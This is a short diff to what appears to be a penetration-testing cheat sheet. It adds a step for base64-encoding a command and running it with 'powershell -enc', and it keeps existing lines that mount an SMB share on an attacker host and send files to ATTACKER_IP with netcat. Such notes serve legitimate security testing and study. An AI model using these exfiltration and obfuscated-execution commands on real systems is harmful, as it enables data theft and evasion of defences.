@@ -327,6 +327,13 @@ $cred = New-Object System.Management.Automation.PSCredential('username', $pass)
 
 # generate smb connection
 New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACKING\ShareName
+
+# Encode command
+cat file | iconv -t utf-16le | base64 -w 0 = result
+
+# Execute enconded command
+echo powershell -enc result
+
 ```
 
 - Impackt
@@ -345,7 +352,7 @@ New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACK
 ### Data extraction
 - NC
   - receiver: nc -nlvt PORT > file
-  - sender:   nc ATTACKER_IP PORT < file 
+  - sender:   nc ATTACKER_IP PORT < file
 
 - Base64
   - target: base64 -w0 file
